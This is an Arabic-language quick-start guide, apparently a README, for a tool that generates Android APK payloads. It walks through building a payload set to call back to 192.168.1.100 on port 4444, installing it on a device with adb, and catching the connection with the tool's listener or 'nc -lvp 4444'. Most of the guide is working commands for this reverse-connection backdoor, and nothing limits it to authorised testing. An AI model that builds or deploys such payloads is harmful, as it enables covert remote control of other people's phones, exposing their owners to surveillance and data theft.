# دليل البدء السريع
## Quick Start Guide

## 🚀 إنشاء APK حقيقي في 5 دقائق

### 1. التثبيت السريع
```bash
# تحميل وتشغيل المثبت
git clone https://github.com/your-repo/android-payload-tool.git
cd android-payload-tool
python install.py
```

### 2. إنشاء APK حقيقي
```bash
# تشغيل الأداة
python main.py --gui

# أو من سطر الأوامر
python main.py
# اختر: 1 (إنشاء بايلود جديد)
```

### 3. تثبيت APK على الجهاز
```bash
# تثبيت مباشر
adb install output/android_payload.apk

# أو استخدام ملف التثبيت
chmod +x output/android_payload_installer.sh
./output/android_payload_installer.sh
```

## 🔧 إذا لم يعمل APK

### الحل السريع
```bash
# إنشاء APK مبسط
python -c "
from core.payload_generator import PayloadGenerator
generator = PayloadGenerator()
result = generator.create_simple_apk('simple_payload', {'lhost': '192.168.1.100', 'lport': 4444})
print(f'APK created: {result}')
"
```

### تثبيت Android SDK
```bash
# تثبيت تلقائي
python -c "from tools.sdk_installer import SDKInstaller; SDKInstaller().setup_complete_environment()"

# أو تثبيت يدوي
# 1. تحميل Android Studio
# 2. تثبيت Android SDK
# 3. إعداد ANDROID_HOME
```

## 📱 اختبار APK

### 1. اختبار الاتصال
```bash
# بدء الاستماع
python main.py
# اختر: 2 (بدء الاستماع)

# أو استخدام netcat
nc -lvp 4444
```

### 2. تثبيت على الجهاز
```bash
# تفعيل وضع المطور
# تفعيل تصحيح USB
# تثبيت APK
adb install output/android_payload.apk
```

## 🆘 حل المشاكل السريع

### مشكلة: "Android SDK not found"
```bash
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$PATH:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/34.0.0
```

### مشكلة: "Java not found"
```bash
# Ubuntu/Debian
sudo apt install openjdk-11-jdk

# macOS
brew install openjdk@11

# Windows: تحميل من https://adoptium.net/
```

### مشكلة: "APK لا يعمل"
```bash
# جرب APK مبسط
python test_apk.py

# أو استخدم مشروع Android Studio
# فتح مجلد output/android_payload_project في Android Studio
```

## 📋 الأوامر المفيدة

### فحص APK
```bash
# فحص محتوى APK
unzip -l output/android_payload.apk

# فحص AndroidManifest.xml
aapt dump xmltree output/android_payload.apk AndroidManifest.xml
```

### تثبيت على محاكي
```bash
# بدء محاكي
emulator -avd Pixel_4_API_30

# تثبيت APK
adb install output/android_payload.apk

# تشغيل التطبيق
adb shell am start -n com.payload.app/.MainActivity
```

### تنظيف الملفات
```bash
# حذف APK القديمة
rm output/*.apk

# حذف مشاريع Android
rm -rf output/*_project
```

## 🎯 نصائح مهمة

1. **لأفضل النتائج**: استخدم Android SDK مثبت
2. **للاختبار السريع**: استخدم APK مبسط
3. **للتخصيص**: استخدم مشروع Android Studio
4. **للأمان**: استخدم مفاتيح توقيع قوية

## 📞 الدعم

- راجع `BUILD_APK.md` للتفاصيل الكاملة
- راجع `README.md` للوثائق الشاملة
- شغل `python test_apk.py` لفحص النظام
